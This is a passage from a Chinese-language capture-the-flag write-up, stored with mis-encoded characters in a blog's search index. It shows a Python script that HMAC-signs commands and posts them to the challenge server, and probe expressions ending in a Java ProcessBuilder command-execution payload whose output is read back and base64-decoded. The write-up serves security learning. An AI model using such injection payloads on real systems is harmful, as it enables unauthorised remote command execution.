å‘é€çš„å‘½ä»¤</span><br><br>Â  Â  appkey = <span class="hljs-string">&quot;DDCTFWithYou&quot;</span><br>Â  Â  time_stamp = str(int(time()))<br>Â  Â  strToSign = cmd + <span class="hljs-string">&#x27;|&#x27;</span> + time_stamp<br><br>Â  Â  <span class="hljs-comment"># hmac_sha256åŠ å¯†</span><br>Â  Â  sha = hmac.new(<br>Â  Â  Â  Â  bytes(appkey, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>),<br>Â  Â  Â  Â  bytes(strToSign, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>),<br>Â  Â  Â  Â  digestmod=hashlib.sha256<br>Â  Â  ).digest()<br>Â  Â  sign = bytes.decode(<br>Â  Â  Â  Â  b64encode(sha)<br>Â  Â  )<br><br>Â  Â  <span class="hljs-comment"># å‘èµ·POSTè¯·æ±‚</span><br>Â  Â  url = <span class="hljs-string">&quot;http://117.51.136.197/server/command&quot;</span><br>Â  Â  data = &#123;<br>Â  Â  Â  Â  <span class="hljs-string">&quot;signature&quot;</span>: sign,<br>Â  Â  Â  Â  <span class="hljs-string">&quot;command&quot;</span>: cmd,<br>Â  Â  Â  Â  <span class="hljs-string">&quot;timestamp&quot;</span>: time_stamp<br>Â  Â  &#125;<br>Â  Â  res = requests.post(<br>Â  Â  Â  Â  url=url,<br>Â  Â  Â  Â  data=json.dumps(data)<br>Â  Â  )<br>Â  Â  pprint(res.text)<br></code></pre></td></tr></table></figure><h2 id="æ­¥éª¤3ï¼šå‘½ä»¤æ‰§è¡Œ"><a href="#æ­¥éª¤3ï¼šå‘½ä»¤æ‰§è¡Œ" class="headerlink" title="æ­¥éª¤3ï¼šå‘½ä»¤æ‰§è¡Œ"></a>æ­¥éª¤3ï¼šå‘½ä»¤æ‰§è¡Œ</h2><p>åˆ¤æ–­åç«¯è¯­è¨€ï¼Œæ„é€  payloadã€‚é¦–å…ˆåˆ©ç”¨è¯­è¨€çš„è¿ç®—ç¬¦æµ‹è¯•æ˜¯å¦æ‰§è¡Œï¼Œæ€»ç»“å­˜åœ¨å“ªäº›è¿ç®—ç¬¦ï¼Œç„¶åæµ‹è¯•å‡ºå­—ç¬¦ä¸²å¯ä»¥ä½¿ç”¨ length å‡½æ•°ï¼ŒçŒœæµ‹å¯èƒ½è¯¥è¯­è¨€ä¸ºã€Œé¢å‘å¯¹è±¡è¯­è¨€ã€ï¼Œä»é€»è¾‘è¿ç®—ç¬¦ != å’Œ length å‡½æ•°çŒœæµ‹å¯èƒ½æ˜¯ <a href="https://coolshell.cn/articles/2631.html">Java è¡ç”Ÿçš„è¯­è¨€</a>ï¼ˆè¾“å…¥çš„å‘½ä»¤ä»¥ # å®šä¹‰å˜é‡ï¼Œå¯ä½¿ç”¨ #a=1 æµ‹è¯•ï¼‰â€”â€”<a href="http://groovy.codehaus.org/"><strong>Groovy</strong></a>ï¼Œä½†æ˜¯å§‹ç»ˆæ— æ³•å®Œç¾åŒ¹é…ã€‚æœ€ç»ˆåœ¨ä¸€ç¯‡<a href="https://zhuanlan.kanxue.com/article-12714.htm">åšå®¢</a>æ‰¾åˆ°çªç ´ç‚¹ï¼Œæ–‡ç« ä¸­çš„å¾ˆå¤šæƒ…æ™¯å¾ˆç¬¦åˆè¯¥é¢˜ç›®ï¼Œæµ‹è¯• java.lang.String.class.forName(â€œjava.lang.Runtimeâ€) æ—¶å‡ºç° command is evilï¼Œæ–­å®šä¸º Groovyã€‚äºæ˜¯ä¾¿å¼€å§‹å¯»æ‰¾ Java å‘½ä»¤æ³¨å…¥ä»£ç ï¼Œ<a href="https://y4er.com/post/java-exec-command/">ç½‘ä¸Šå¤§å¤šæ•°çš„å‘½ä»¤æ‰§è¡Œ</a>å¤§éƒ½æ˜¯ä½¿ç”¨ Runtime ç±»æˆ– Processbuider ç±»ï¼Œä½†éƒ½æ˜¯å¤šè¡Œä»£ç çš„å½¢å¼ï¼Œ<a href="https://github.com/t0kx/exploit-CVE-2015-1427/blob/master/exploit.sh">CVE-2015-1427 çš„ exploit</a> ä¹Ÿæ— æ³•æ‰§è¡Œã€‚ç½‘ä¸Šçš„å‘½ååªæœ‰ä¸€è¡Œä¸ºå‘½ä»¤æ‰§è¡Œï¼Œæˆ‘ä»¬çŒœæµ‹å¯ä»¥é‡‡ç”¨ä¹±ç æ–¹å¼è¿›è¡Œå›æ˜¾ï¼Œç„¶ååœ¨æœ¬åœ°è§£ç ï¼Œç„¶åä» IDEA è‡ªåŠ¨è¡¥å…¨æ‰¾åˆ° readAllBytes å‡½æ•°ï¼Œå°†æ•°æ®è¯»å‡ºã€‚ç„¶åæŠŠè¯»å‡ºçš„æ•°æ®ä½¿ç”¨ Base64 è§£ç å°±å¾—åˆ°å‘½ä»¤æ‰§è¡Œçš„ç»“æœã€‚</p><p>å›¾3ï¼šç¼–ç¨‹è¯­è¨€åˆ†ç±»<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20200913233927.png"></p><p>codeï¼šä¸€äº›å…³é”®æ€§çš„æµ‹è¯•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">1</span> == true<br><span class="hljs-comment">#a = 1</span><br>&#123;<span class="hljs-number">1</span>&#125;<br><span class="hljs-string">&#x27;abc&#x27;</span>.length()<br><span class="hljs-string">&#x27;abc&#x27;</span>.concat(<span class="hljs-string">&#x27;d&#x27;</span>)<br><span class="hljs-string">&#x27;12 &#x27;</span>.trim()<br><span class="hljs-string">&#x27;1234&#x27;</span>.getBytes()<br><span class="hljs-string">&#x27;hello&#x27;</span>.startsWith(<span class="hljs-string">&#x27;1&#x27;</span>)<br>new ProcessBuilder(<span class="hljs-string">&quot;ls&quot;</span>).start().getInputStream().readAllBytes()<br></code></pre></td></tr></table></figure><p>å›¾4ï¼šä½¿ç”¨ readAllBytes è¯»å‡ºæ•°æ®<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/image-20200913234130453.png" alt="image-20200913234130453"></p><p>å°†è¯»å‡ºçš„æ•°æ®ä½¿ç”¨ base64 è§£å¼€å³å¯ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>å®‰å…¨</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>JWT</tag>
      
      <tag>Javaå‘½ä»¤æ‰§è¡Œ</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
